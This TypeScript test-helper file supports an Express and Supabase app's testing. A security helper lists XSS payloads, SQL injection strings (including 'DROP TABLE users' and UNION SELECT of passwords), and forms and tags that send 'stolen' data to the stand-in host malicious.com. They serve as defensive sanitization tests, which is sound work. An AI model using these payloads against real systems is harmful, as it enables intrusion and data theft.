// Test utilities and helpers
// Shared utilities for testing across different test types

// App factory for creating test instances
export function createApp() {
  const express = require('express');
  const app = express();
  
  // Middleware
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  
  // CORS for testing
  app.use((req: any, res: any, next: any) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key, X-CSRF-Token');
    
    if (req.method === 'OPTIONS') {
      res.sendStatus(200);
    } else {
      next();
    }
  });
  
  return app;
}

// Database test utilities
export class TestDatabase {
  private static instance: TestDatabase;
  private connection: any;

  static getInstance(): TestDatabase {
    if (!TestDatabase.instance) {
      TestDatabase.instance = new TestDatabase();
    }
    return TestDatabase.instance;
  }

  async connect() {
    // Mock database connection for testing
    this.connection = {
      query: jest.fn().mockResolvedValue({ rows: [] }),
      end: jest.fn(),
    };
    return this.connection;
  }

  async disconnect() {
    if (this.connection) {
      await this.connection.end();
    }
  }

  async seedDatabase(data: any) {
    // Mock data seeding
    return Promise.resolve();
  }

  async clearDatabase() {
    // Mock database clearing
    return Promise.resolve();
  }

  getConnection() {
    return this.connection;
  }
}

// Mock services
export class MockSupabaseService {
  static createMockClient() {
    return {
      from: jest.fn(() => ({
        select: jest.fn(() => ({
          eq: jest.fn(() => ({
            single: jest.fn().mockResolvedValue({ data: null }),
            maybeSingle: jest.fn().mockResolvedValue({ data: null }),
          })),
          order: jest.fn(() => ({
            limit: jest.fn().mockResolvedValue({ data: [] }),
          })),
        })),
        insert: jest.fn(() => ({
          select: jest.fn(() => ({
            single: jest.fn().mockResolvedValue({ data: {} }),
          })),
        })),
        update: jest.fn(() => ({
          eq: jest.fn(() => ({
            select: jest.fn(() => ({
              single: jest.fn().mockResolvedValue({ data: {} }),
            })),
          })),
        })),
        delete: jest.fn(() => ({
          eq: jest.fn().mockResolvedValue({ data: null }),
        })),
      })),
      auth: {
        getUser: jest.fn().mockResolvedValue({ data: { user: null } }),
        signOut: jest.fn().mockResolvedValue({ error: null }),
        signInWithPassword: jest.fn().mockResolvedValue({ 
          data: { user: {}, session: {} }, 
          error: null 
        }),
        signUp: jest.fn().mockResolvedValue({ 
          data: { user: {}, session: {} }, 
          error: null 
        }),
      },
    };
  }
}

// API testing utilities
export class APITestHelper {
  static async createAuthenticatedRequest(app: any, endpoint: string, token: string) {
    return {
      get: (path: string) => this.makeRequest(app, 'GET', path, token),
      post: (path: string, data?: any) => this.makeRequest(app, 'POST', path, token, data),
      put: (path: string, data?: any) => this.makeRequest(app, 'PUT', path, token, data),
      delete: (path: string) => this.makeRequest(app, 'DELETE', path, token),
    };
  }

  private static async makeRequest(app: any, method: string, path: string, token: string, data?: any) {
    const fetch = require('node-fetch');
    const options: any = {
      method,
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
      },
    };

    if (data && (method === 'POST' || method === 'PUT')) {
      options.body = JSON.stringify(data);
    }

    return fetch(`http://localhost:3000${path}`, options);
  }

  static async waitForCondition(condition: () => boolean, timeout: number = 5000) {
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
      if (condition()) {
        return true;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    throw new Error(`Condition not met within ${timeout}ms`);
  }
}

// Performance testing utilities
export class PerformanceTestHelper {
  static async measureAsyncOperation(operation: () => Promise<any>) {
    const startTime = performance.now();
    const result = await operation();
    const endTime = performance.now();
    
    return {
      result,
      duration: endTime - startTime,
    };
  }

  static async measureSyncOperation(operation: () => any) {
    const startTime = performance.now();
    const result = operation();
    const endTime = performance.now();
    
    return {
      result,
      duration: endTime - startTime,
    };
  }

  static createLoadTestConfig(concurrentUsers: number, duration: number) {
    return {
      concurrentUsers,
      duration,
      rampUpTime: Math.min(duration * 0.1, 5000), // 10% or 5 seconds max
      thinkTime: 1000, // 1 second between requests
    };
  }

  static async runLoadTest(config: any, endpoint: string, authToken?: string) {
    const results = {
      successful: 0,
      failed: 0,
      responseTimes: [] as number[],
      errors: [] as string[],
    };

    const startTime = Date.now();
    const endTime = startTime + config.duration;

    const userLoops = Array.from({ length: config.concurrentUsers }, async () => {
      while (Date.now() < endTime) {
        try {
          const requestStart = performance.now();
          
          const response = await fetch(`http://localhost:3000${endpoint}`, {
            method: 'GET',
            headers: {
              'Authorization': authToken ? `Bearer ${authToken}` : undefined,
            },
          });
          
          const requestEnd = performance.now();
          
          if (response.ok) {
            results.successful++;
          } else {
            results.failed++;
            results.errors.push(`HTTP ${response.status}`);
          }
          
          results.responseTimes.push(requestEnd - requestStart);
          
          // Wait for think time
          await new Promise(resolve => setTimeout(resolve, config.thinkTime));
        } catch (error) {
          results.failed++;
          results.errors.push(error.message);
        }
      }
    });

    await Promise.all(userLoops);

    return this.calculateMetrics(results);
  }

  private static calculateMetrics(results: any) {
    const avgResponseTime = results.responseTimes.reduce((a: number, b: number) => a + b, 0) / results.responseTimes.length;
    const sortedTimes = [...results.responseTimes].sort((a: number, b: number) => a - b);
    const p95Index = Math.floor(sortedTimes.length * 0.95);
    const p95ResponseTime = sortedTimes[p95Index] || 0;

    return {
      ...results,
      avgResponseTime,
      p95ResponseTime,
      throughput: results.successful / ((Date.now() - startTime) / 1000),
      successRate: (results.successful / (results.successful + results.failed)) * 100,
    };
  }
}

// Security testing utilities
export class SecurityTestHelper {
  static generateXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '\';alert("XSS");//',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    ];
  }

  static generateSQLInjectionPayloads() {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "UNION SELECT * FROM users",
      "1' OR 1=1--",
      "admin'--",
      "1' UNION SELECT password FROM users WHERE '1'='1",
    ];
  }

  static generateCSRFPayloads() {
    return [
      '<form action="http://malicious.com/steal" method="POST"><input type="hidden" name="data" value="stolen" /></form>',
      '<iframe src="http://malicious.com/track"></iframe>',
      '<img src="http://malicious.com/track" width="1" height="1" />',
    ];
  }

  static async testInputSanitization(input: string, sanitizer: (input: string) => string) {
    const sanitized = sanitizer(input);
    return {
      original: input,
      sanitized,
      isSanitized: sanitized !== input,
      hasScriptTag: sanitized.includes('<script>'),
      hasEventHandler: /\son\w+=/i.test(sanitized),
      hasJavascriptProtocol: sanitized.includes('javascript:'),
    };
  }

  static async checkSecurityHeaders(url: string) {
    const response = await fetch(url);
    const headers = response.headers;
    
    return {
      contentTypeOptions: headers.get('X-Content-Type-Options'),
      frameOptions: headers.get('X-Frame-Options'),
      xssProtection: headers.get('X-XSS-Protection'),
      strictTransport: headers.get('Strict-Transport-Security'),
      contentSecurityPolicy: headers.get('Content-Security-Policy'),
      referrerPolicy: headers.get('Referrer-Policy'),
    };
  }
}

// E2E testing utilities
export class E2ETestHelper {
  static async setupBrowser(browserType: 'chromium' | 'firefox' | 'webkit' = 'chromium') {
    const { chromium, firefox, webkit } = require('playwright');
    
    let browser;
    switch (browserType) {
      case 'firefox':
        browser = await firefox.launch();
        break;
      case 'webkit':
        browser = await webkit.launch();
        break;
      default:
        browser = await chromium.launch();
    }
    
    return browser;
  }

  static async createTestPage(browser: any, options: any = {}) {
    const context = await browser.newContext({
      viewport: { width: 1920, height: 1080 },
      ignoreHTTPSErrors: true,
      ...options,
    });
    
    const page = await context.newPage();
    
    // Mock localStorage
    await page.addInitScript(() => {
      const store = {};
      Object.defineProperty(window, 'localStorage', {
        value: {
          getItem: (key: string) => store[key] || null,
          setItem: (key: string, value: string) => { store[key] = value; },
          removeItem: (key: string) => { delete store[key]; },
          clear: () => { Object.keys(store).forEach(key => delete store[key]); },
        },
        writable: false,
      });
    });
    
    return { page, context };
  }

  static async login(page: any, credentials: { email: string; password: string }) {
    await page.goto('/login');
    await page.fill('[data-testid="email-input"]', credentials.email);
    await page.fill('[data-testid="password-input"]', credentials.password);
    await page.click('[data-testid="login-button"]');
    await page.waitForURL('/dashboard');
  }

  static async waitForNetworkIdle(page: any, timeout: number = 5000) {
    await page.waitForLoadState('networkidle', { timeout });
  }

  static async takeScreenshot(page: any, name: string) {
    await page.screenshot({ path: `test-results/screenshots/${name}.png` });
  }
}

// Test data generators
export class TestDataGenerator {
  static generateUser(overrides: any = {}) {
    return {
      id: 'user_' + Math.random().toString(36).substr(2, 9),
      email: `test${Math.random().toString(36).substr(2, 5)}@example.com`,
      name: 'Test User',
      role: 'user',
      createdAt: new Date().toISOString(),
      ...overrides,
    };
  }

  static generateCampaign(overrides: any = {}) {
    const now = new Date();
    const futureDate = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);
    
    return {
      id: 'campaign_' + Math.random().toString(36).substr(2, 9),
      name: `Test Campaign ${Math.random().toString(36).substr(2, 5)}`,
      description: 'Test campaign description',
      budget: Math.floor(Math.random() * 10000) + 1000,
      status: 'draft',
      startDate: now.toISOString(),
      endDate: futureDate.toISOString(),
      targetAudience: 'all',
      createdAt: now.toISOString(),
      ...overrides,
    };
  }

  static generateGroup(overrides: any = {}) {
    return {
      id: 'group_' + Math.random().toString(36).substr(2, 9),
      name: `Test Group ${Math.random().toString(36).substr(2, 5)}`,
      type: 'public',
      members: Math.floor(Math.random() * 1000) + 1,
      description: 'Test group description',
      createdAt: new Date().toISOString(),
      ...overrides,
    };
  }

  static generateSession(overrides: any = {}) {
    return {
      id: 'session_' + Math.random().toString(36).substr(2, 9),
      phoneNumber: '+1234567890',
      status: 'active',
      lastActivity: new Date().toISOString(),
      ...overrides,
    };
  }

  static generateLargeDataset(size: number, itemGenerator: () => any) {
    return Array.from({ length: size }, itemGenerator);
  }
}

// Assertion helpers
export class CustomAssertions {
  static toBeWithinTolerance(actual: number, expected: number, tolerance: number) {
    const pass = Math.abs(actual - expected) <= tolerance;
    
    return {
      pass,
      message: () => pass
        ? `expected ${actual} not to be within ${tolerance} of ${expected}`
        : `expected ${actual} to be within ${tolerance} of ${expected}`,
    };
  }

  static toHaveValidDate(dateString: string) {
    const date = new Date(dateString);
    const pass = !isNaN(date.getTime()) && date.toISOString() === dateString;
    
    return {
      pass,
      message: () => pass
        ? `expected ${dateString} not to be a valid ISO date`
        : `expected ${dateString} to be a valid ISO date`,
    };
  }

  static toBeSortedBy(array: any[], key: string, options: any = {}) {
    const { descending = false } = options;
    const sorted = [...array].sort((a, b) => {
      if (descending) {
        return b[key] - a[key];
      }
      return a[key] - b[key];
    });
    
    const pass = JSON.stringify(array) === JSON.stringify(sorted);
    
    return {
      pass,
      message: () => pass
        ? `expected array not to be sorted by ${key}${descending ? ' (descending)' : ''}`
        : `expected array to be sorted by ${key}${descending ? ' (descending)' : ''}`,
    };
  }
}

// Mock external services
export class MockExternalServices {
  static mockTelegramClient() {
    const mockClient = {
      sendCode: jest.fn().mockResolvedValue({ success: true }),
      verifyCode: jest.fn().mockResolvedValue({ success: true, sessionId: 'session123' }),
      getGroups: jest.fn().mockResolvedValue({
        data: [
          { id: 'group1', name: 'Test Group 1', members: 100 },
          { id: 'group2', name: 'Test Group 2', members: 200 },
        ],
      }),
      extractMembers: jest.fn().mockResolvedValue({ success: true, count: 50 }),
      joinGroup: jest.fn().mockResolvedValue({ success: true }),
    };

    jest.mock('@/lib/telegram/client', () => mockClient);
    return mockClient;
  }

  static mockEmailService() {
    const mockService = {
      sendEmail: jest.fn().mockResolvedValue({ success: true, messageId: 'msg123' }),
      sendBulkEmail: jest.fn().mockResolvedValue({ success: true, sent: 100 }),
    };

    jest.mock('@/lib/services/email', () => mockService);
    return mockService;
  }

  static mockStorageService() {
    const mockService = {
      uploadFile: jest.fn().mockResolvedValue({ 
        success: true, 
        url: 'https://storage.example.com/file.jpg',
        key: 'uploads/file.jpg',
      }),
      deleteFile: jest.fn().mockResolvedValue({ success: true }),
      getSignedUrl: jest.fn().mockResolvedValue({ 
        success: true, 
        url: 'https://storage.example.com/signed-url',
      }),
    };

    jest.mock('@/lib/services/storage', () => mockService);
    return mockService;
  }
}

// Test environment setup
export async function setupTestEnvironment() {
  // Set test environment variables
  process.env.NODE_ENV = 'test';
  process.env.DATABASE_URL = 'postgresql://test:test@localhost:5432/test_db';
  process.env.JWT_SECRET = 'test-jwt-secret';
  process.env.ENCRYPTION_KEY = 'test-encryption-key-32-chars';
  
  // Setup test database
  const testDb = TestDatabase.getInstance();
  await testDb.connect();
  
  return testDb;
}

export async function teardownTestEnvironment() {
  // Clean up test database
  const testDb = TestDatabase.getInstance();
  await testDb.clearDatabase();
  await testDb.disconnect();
  
  // Restore environment variables
  delete process.env.DATABASE_URL;
  delete process.env.JWT_SECRET;
  delete process.env.ENCRYPTION_KEY;
}